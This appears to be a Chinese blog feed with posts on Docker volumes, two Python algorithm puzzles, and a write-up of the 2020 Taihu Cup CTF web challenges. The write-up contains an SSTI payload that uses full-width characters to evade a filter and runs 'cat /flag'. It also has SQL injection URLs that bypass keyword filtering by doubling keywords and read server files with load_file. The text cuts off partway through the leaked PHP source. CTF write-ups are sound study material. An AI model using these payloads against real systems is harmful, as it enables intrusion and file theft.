srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1607256904483"></p><p>假设构建镜像的时候没有挂载卷，要通过-v手动挂载数据卷，<code>-v 卷名：容器内路径</code></p><h3 id="容器数据卷-1"><a href="#容器数据卷-1" class="headerlink" title="容器数据卷"></a>容器数据卷</h3><hr><p>多个mysql同步数据！可以通过同步数据卷来实现。</p><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1607257116209.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1607257116209.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1607257116209"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">讲上面我们构造的centos镜像 run起来</span></span><br><span class="line">docker run -it --name docker01 moth/centos /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash">在 volume01下touch一个文件</span> </span><br><span class="line">touch docker01</span><br><span class="line"><span class="meta">#</span><span class="bash">通过 --volumes-from docker01 同步卷到docker02</span></span><br><span class="line">docker run -it --name docker02 --volumes-from docker01 moth/centos /bin/bash</span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1607257676115.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1607257676115.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1607257676115"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">测试：可以删除docker01，查看一下docker02和docker03是否还可以访问这个文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash">测试依然可以访问</span></span><br><span class="line">[root@iZ8vbgt047thtwcw9p956rZ test]# docker rm -f docker01</span><br><span class="line">docker01</span><br><span class="line">[root@iZ8vbgt047thtwcw9p956rZ test]# docker attach docker02</span><br><span class="line">[root@d7754b493f3d volume01]# ls</span><br><span class="line">docker01</span><br></pre></td></tr></table></figure><p>多个mysql实现数据共享</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d  -p 3310:3306 -v /etc/mysql/conf.d -v /var/lib/mysql  -e MYSQL_ROOT_PASSWORD=123456</span><br><span class="line">--name mysql01 mysql:5.7 </span><br><span class="line">docker run -d  -p 3310:3306 --volumes-from docker01 -e MYSQL_ROOT_PASSWORD=123456   --name mysql02 mysql:5.7</span><br></pre></td></tr></table></figure><p><strong>结论：</strong></p><p>容器之间配置信息的传递，数据卷容器的生命周期一直持续到没有容器使用为止。</p><p>但是一旦持久化到了本地， 这个时候，本地的数据是不会删除的！</p>]]></content>
      
      
      <categories>
          
          <category> linux运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法入门--读心术之信息编码</title>
      <link href="2020/12/01/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%AF%BB%E5%BF%83%E6%9C%AF%E4%B9%8B%E4%BF%A1%E6%81%AF%E7%BC%96%E7%A0%81/"/>
      <url>2020/12/01/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%AF%BB%E5%BF%83%E6%9C%AF%E4%B9%8B%E4%BF%A1%E6%81%AF%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>输入，条件控制，信息编码和解码</p><span id="more"></span><p>0x01 基本问题及解决</p><p>一副扑克牌，任选5张，通过某种特定的规则，有序的展示其中的四张牌。即可猜到仅剩的一张牌的花色和大小</p><p>生成一副牌的列表  ‘A_C’ ‘A_D’ ‘A_H’ ‘A_S’ C D H S 表示花色 A 1 2 3 4 5 6 7 8 9 10 J Q K 表示大小</p><p>生成代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">deck=[<span class="string">&#x27;_&#x27;</span>]*<span class="number">52</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">52</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">4</span>==<span class="number">0</span>:</span><br><span class="line">        deck[i]=deck[i]+<span class="string">&#x27;C&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i%<span class="number">4</span>==<span class="number">1</span>:</span><br><span class="line">        deck[i]=deck[i]+<span class="string">&#x27;D&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i%<span class="number">4</span>==<span class="number">2</span>:</span><br><span class="line">        deck[i]=deck[i]+<span class="string">&#x27;H&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i%<span class="number">4</span>==<span class="number">3</span>:</span><br><span class="line">        deck[i]=deck[i]+<span class="string">&#x27;S&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">13</span>==<span class="number">0</span>:</span><br><span class="line">        deck[i]=<span class="string">&#x27;A&#x27;</span>+deck[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">13</span>==j:</span><br><span class="line">            deck[i]=<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;1&#x27;</span>)+j)+deck[i]</span><br><span class="line">   <span class="keyword">if</span> i%<span class="number">13</span>==<span class="number">9</span>:</span><br><span class="line">        deck[i]=<span class="string">&#x27;10&#x27;</span>+deck[i]</span><br><span class="line"><span class="keyword">if</span> i%<span class="number">13</span>==<span class="number">10</span>:</span><br><span class="line">        deck[i]=<span class="string">&#x27;J&#x27;</span>+deck[i]</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">13</span>==<span class="number">11</span>:</span><br><span class="line">        deck[i]=<span class="string">&#x27;Q&#x27;</span>+deck[i]</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">13</span>==<span class="number">12</span>:</span><br><span class="line">        deck[i]=<span class="string">&#x27;K&#x27;</span>+deck[i]</span><br><span class="line"><span class="built_in">print</span>(deck)</span><br><span class="line"><span class="comment">#输出结果为：</span></span><br><span class="line">[<span class="string">&#x27;A_C&#x27;</span>, <span class="string">&#x27;2_D&#x27;</span>, <span class="string">&#x27;3_H&#x27;</span>, <span class="string">&#x27;4_S&#x27;</span>, <span class="string">&#x27;5_C&#x27;</span>, <span class="string">&#x27;6_D&#x27;</span>, <span class="string">&#x27;7_H&#x27;</span>, <span class="string">&#x27;8_S&#x27;</span>, <span class="string">&#x27;9_C&#x27;</span>, <span class="string">&#x27;10_D&#x27;</span>, <span class="string">&#x27;J_H&#x27;</span>, <span class="string">&#x27;Q_S&#x27;</span>, <span class="string">&#x27;K_C&#x27;</span>, <span class="string">&#x27;A_D&#x27;</span>, <span class="string">&#x27;2_H&#x27;</span>, <span class="string">&#x27;3_S&#x27;</span>, <span class="string">&#x27;4_C&#x27;</span>, <span class="string">&#x27;5_D&#x27;</span>, <span class="string">&#x27;6_H&#x27;</span>, <span class="string">&#x27;7_S&#x27;</span>, <span class="string">&#x27;8_C&#x27;</span>, <span class="string">&#x27;9_D&#x27;</span>, <span class="string">&#x27;10_H&#x27;</span>, <span class="string">&#x27;J_S&#x27;</span>, <span class="string">&#x27;Q_C&#x27;</span>, <span class="string">&#x27;K_D&#x27;</span>, <span class="string">&#x27;A_H&#x27;</span>, <span class="string">&#x27;2_S&#x27;</span>, <span class="string">&#x27;3_C&#x27;</span>, <span class="string">&#x27;4_D&#x27;</span>, <span class="string">&#x27;5_H&#x27;</span>, <span class="string">&#x27;6_S&#x27;</span>, <span class="string">&#x27;7_C&#x27;</span>, <span class="string">&#x27;8_D&#x27;</span>, <span class="string">&#x27;9_H&#x27;</span>, <span class="string">&#x27;10_S&#x27;</span>, <span class="string">&#x27;J_C&#x27;</span>, <span class="string">&#x27;Q_D&#x27;</span>, <span class="string">&#x27;K_H&#x27;</span>, <span class="string">&#x27;A_S&#x27;</span>, <span class="string">&#x27;2_C&#x27;</span>, <span class="string">&#x27;3_D&#x27;</span>, <span class="string">&#x27;4_H&#x27;</span>, <span class="string">&#x27;5_S&#x27;</span>, <span class="string">&#x27;6_C&#x27;</span>, <span class="string">&#x27;7_D&#x27;</span>, <span class="string">&#x27;8_H&#x27;</span>, <span class="string">&#x27;9_S&#x27;</span>, <span class="string">&#x27;10_C&#x27;</span>, <span class="string">&#x27;J_D&#x27;</span>, <span class="string">&#x27;Q_H&#x27;</span>, <span class="string">&#x27;K_S&#x27;</span>]</span><br></pre></td></tr></table></figure><p>通过编程我们先来模拟助手的工作</p><p>此种发牌利用的数学原理为</p><ul><li>如果将13张牌环路程一个闭环，那么任何两张牌之间的距离都可以用1跳到6跳来表示，有时候顺时针跳数可能为7但是逆时针跳数就必然为6</li><li>按照52张牌(去掉大小王)排序法，按点数排序从小到大，相同大小时，假设每一张牌花色中的梅花小于方片小于红桃小于黑桃，这样我们就把52张牌排序成功</li><li>根据抽屉原理，四种花色五张牌，则必然有相同花色的牌</li></ul><p>这样根据以上三条规律，即可推算出助手的工作方法</p><p>首先找出同花色的两张牌，跟魔术师提前沟通好都按顺时针来跳牌，通过判断这两张牌的顺时针距离小于等于6跳，来决定被猜牌为哪一个，基准牌为另一个，基准牌为第一个展示的牌，同时根据剩下的三张牌</p><p>按照</p><ul><li>（小，中，大）=1</li><li>（小，大，中）=2</li><li>（中，小，大）=3</li><li>（中，大，小）=4</li><li>（大，小，中）=5</li><li>（大，中，小）=6</li></ul><p>通过展示剩余三张牌的顺序即可暗示魔术师跳数</p><p>通过代码实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deck</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 用python解决算法谜题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法入门--时间选择</title>
      <link href="2020/11/30/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E9%80%89%E6%8B%A9/"/>
      <url>2020/11/30/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E9%80%89%E6%8B%A9/</url>
      
        <content type="html"><![CDATA[<p>元组、元组列表、for循环、浮点数、列表切片、排序等等</p><span id="more"></span><h3 id="0x01-基本问题及解决"><a href="#0x01-基本问题及解决" class="headerlink" title="0x01 基本问题及解决"></a>0x01 基本问题及解决</h3><p>给出人们出席会议的时间，求在某一时间内出席人数最多的时间段和人数</p><p>反复检查时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">sched=[(<span class="number">6</span>,<span class="number">8</span>),(<span class="number">6</span>,<span class="number">12</span>),(<span class="number">6</span>,<span class="number">7</span>),(<span class="number">7</span>,<span class="number">8</span>),</span><br><span class="line">       (<span class="number">7</span>,<span class="number">10</span>),(<span class="number">8</span>,<span class="number">9</span>),(<span class="number">8</span>,<span class="number">10</span>),(<span class="number">9</span>,<span class="number">12</span>),</span><br><span class="line">       (<span class="number">9</span>,<span class="number">10</span>),(<span class="number">10</span>,<span class="number">11</span>),(<span class="number">10</span>,<span class="number">12</span>),(<span class="number">11</span>,<span class="number">12</span>)]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bestTimeToPart</span>(<span class="params">schedule</span>):</span></span><br><span class="line">    start,end=celebrityTimeLong(schedule)</span><br><span class="line">    count=celebrityDenisity(schedule,start,end)</span><br><span class="line">    maxcout=<span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(count)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start,end+<span class="number">1</span>):<span class="comment">#&lt;--对此可以进行优化如下</span></span><br><span class="line">        <span class="keyword">if</span> count[i]&gt;maxcout:</span><br><span class="line">            maxcout=count[i]</span><br><span class="line">            time=i</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;The best time to attend the party is at&#x27;</span>,time,<span class="string">&#x27;o\&#x27;clock&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,maxcout,</span><br><span class="line">          <span class="string">&#x27;celebrities will be attending!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">celebrityDenisity</span>(<span class="params">schedule,start,end</span>):</span></span><br><span class="line">    count=[<span class="number">0</span>]*(end+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start,end+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> schedule:</span><br><span class="line">            <span class="keyword">if</span> c[<span class="number">0</span>]&lt;=i <span class="keyword">and</span> c[<span class="number">1</span>]&gt;i:</span><br><span class="line">                count[i]+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">celebrityTimeLong</span>(<span class="params">sched吧ule</span>):</span></span><br><span class="line">    start=schedule[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    end=schedule[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> schedule:</span><br><span class="line">        start=<span class="built_in">min</span>(i[<span class="number">0</span>],start)</span><br><span class="line">        end=<span class="built_in">max</span>(i[<span class="number">1</span>],end)</span><br><span class="line">    <span class="keyword">return</span>  start,end</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bestTimeToPart(sched)</span><br></pre></td></tr></table></figure><p>python提供一种更为简单的算列表中的最大值的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">maxcount=<span class="built_in">max</span>(count[start:end+<span class="number">1</span>])</span><br><span class="line">time=count.index(maxcount)</span><br></pre></td></tr></table></figure><h3 id="0x02-代码优化"><a href="#0x02-代码优化" class="headerlink" title="0x02 代码优化"></a>0x02 代码优化</h3><p>因为时间的原因，精度问题很难用以上算法解决，需要一个不依赖时间精度的算法</p><p>把时间当做横轴，将每一个出席者的出席时间画成线，求时间重合的最多的区间即为人数最多的时间，竖线与横线交点最多的时间区间</p><p><img src="/2020/11/30/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E9%80%89%E6%8B%A9/1606699880107.png" class="lazyload" data-srcset="/2020/11/30/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E9%80%89%E6%8B%A9/1606699880107.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606699880107"></p><p>这样，我们不再关注时间精度问题，只需要关心每一个出席者的时间区间的起点和终点即可</p><p>但是这样我们涉及到一个排序问题需要解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">sched2=[(<span class="number">6.0</span>,<span class="number">8.0</span>),(<span class="number">6.5</span>,<span class="number">12.0</span>),(<span class="number">6.5</span>,<span class="number">7.0</span>),(<span class="number">7.0</span>,<span class="number">8.0</span>),(<span class="number">7.5</span>,<span class="number">10.0</span>),(<span class="number">8.0</span>,<span class="number">9.0</span>),</span><br><span class="line">        (<span class="number">8.0</span>,<span class="number">10.0</span>),(<span class="number">9.0</span>,<span class="number">12.0</span>),(<span class="number">9.5</span>,<span class="number">12.0</span>),(<span class="number">9.5</span>,<span class="number">10.0</span>),(<span class="number">10.0</span>,<span class="number">11.0</span>),(<span class="number">10.0</span>,<span class="number">12.0</span>),(<span class="number">11.0</span>,<span class="number">12.0</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bestTimeToPartyTime</span>(<span class="params">schedule</span>):</span></span><br><span class="line">    times=[]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> schedule:</span><br><span class="line">        times.append([c[<span class="number">0</span>],<span class="string">&#x27;start&#x27;</span>])</span><br><span class="line">        times.append([c[<span class="number">1</span>],<span class="string">&#x27;end&#x27;</span>])</span><br><span class="line">    times=sortList(times)</span><br><span class="line">    <span class="built_in">print</span>(times)</span><br><span class="line">    maxcount,time=chooseTime(times)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Best time to attend the party is at&#x27;</span>,time,<span class="string">&#x27;o\&#x27;clock&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,maxcount,<span class="string">&#x27;celebrities will be attending&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sortList</span>(<span class="params">tlist</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tlist)-<span class="number">1</span>):</span><br><span class="line">        iSm=i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i,<span class="built_in">len</span>(tlist)):</span><br><span class="line">            <span class="keyword">if</span> tlist[iSm][<span class="number">0</span>]&gt;tlist[j][<span class="number">0</span>]:</span><br><span class="line">                iSm=j</span><br><span class="line">        tlist[i],tlist[iSm]=tlist[iSm],tlist[i]</span><br><span class="line">    <span class="keyword">return</span>  tlist</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chooseTime</span>(<span class="params">times</span>):</span></span><br><span class="line">    rcount=<span class="number">0</span></span><br><span class="line">    maxcount=time=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> times:</span><br><span class="line">        <span class="keyword">if</span> t[<span class="number">1</span>]==<span class="string">&#x27;start&#x27;</span>:</span><br><span class="line">            rcount=rcount+<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> t[<span class="number">1</span>]==<span class="string">&#x27;end&#x27;</span>:</span><br><span class="line">            rcount=rcount-<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> rcount&gt;maxcount:</span><br><span class="line">            maxcount= rcount</span><br><span class="line">            time=t[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> maxcount,time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bestTimeToPartyTime(sched2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 用python解决算法谜题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020太湖杯web部分wp</title>
      <link href="2020/11/07/%E2%80%9C%E5%A4%AA%E6%B9%96%E6%9D%AFweb%E9%83%A8%E5%88%86wp/"/>
      <url>2020/11/07/%E2%80%9C%E5%A4%AA%E6%B9%96%E6%9D%AFweb%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p>太湖杯web部分wp</p><span id="more"></span><h3 id="web1-checkInGame"><a href="#web1-checkInGame" class="headerlink" title="web1- checkInGame"></a>web1- checkInGame</h3><p>一开始以为是一道js的逆向题，后来看师傅们秒的那么快肯定是签到题，然后尝试抓包，发现抓包后游戏能够继续（时间仍然在减少），时间减到零时，消消乐的图标缺不再刷新，由此相当于获得了无穷的时间去完成，当然是有手就行</p><p><img src="/2020/11/07/%E2%80%9C%E5%A4%AA%E6%B9%96%E6%9D%AFweb%E9%83%A8%E5%88%86wp/1604752829367.png" class="lazyload" data-srcset="/2020/11/07/%E2%80%9C%E5%A4%AA%E6%B9%96%E6%9D%AFweb%E9%83%A8%E5%88%86wp/1604752829367.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1604752829367"></p><h3 id="web2-easyweb"><a href="#web2-easyweb" class="headerlink" title="web2-easyweb"></a>web2-easyweb</h3><p>上来一个字符规范器</p><p>测试后端是python写的，测试SSTI漏洞</p><p>发现正常的{} “等字符的都被过滤了，队里的师傅找了到了一些中文的字符来绕过，ssti漏洞利用本身没有什么难度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">｛｛[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[＂os＂][＂popen＂](＂cat &#x2F;flag＂).read()｝｝</span><br></pre></td></tr></table></figure><p><img src="/2020/11/07/%E2%80%9C%E5%A4%AA%E6%B9%96%E6%9D%AFweb%E9%83%A8%E5%88%86wp/1604839766666.png" class="lazyload" data-srcset="/2020/11/07/%E2%80%9C%E5%A4%AA%E6%B9%96%E6%9D%AFweb%E9%83%A8%E5%88%86wp/1604839766666.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1604839766666"></p><h3 id="web3-Croosfire"><a href="#web3-Croosfire" class="headerlink" title="web3-Croosfire"></a>web3-Croosfire</h3><p>这题没做出来，题挺好，我太菜</p><p>发现一个上传点，好像能双写绕过拿数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;122.112.249.228:10085&#x2F;index.php?id&#x3D;1%20ununionion%20selselectect%20database()#</span><br></pre></td></tr></table></figure><p><img src="/2020/11/07/%E2%80%9C%E5%A4%AA%E6%B9%96%E6%9D%AFweb%E9%83%A8%E5%88%86wp/1604842583702.png" class="lazyload" data-srcset="/2020/11/07/%E2%80%9C%E5%A4%AA%E6%B9%96%E6%9D%AFweb%E9%83%A8%E5%88%86wp/1604842583702.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1604842583702"></p><p>数据库名为shuyu 当前用户是root</p><p>但是这个题不是纯粹的注入 尝试读一下源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;122.112.249.228:10085&#x2F;index.php?id&#x3D;-1%27%20ununionion%20selselectect%20load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870)%23</span><br><span class="line">id&#x3D;-1%27%20ununionion%20selselectect%20load_file(0x2f7461722e7079)%23</span><br></pre></td></tr></table></figure><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$upload</span> = <span class="string">&#x27;upload/&#x27;</span>.md5(<span class="string">&quot;shuyu&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @mkdir(<span class="variable">$upload</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$upload</span>.<span class="string">&#x27;/index.html&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span 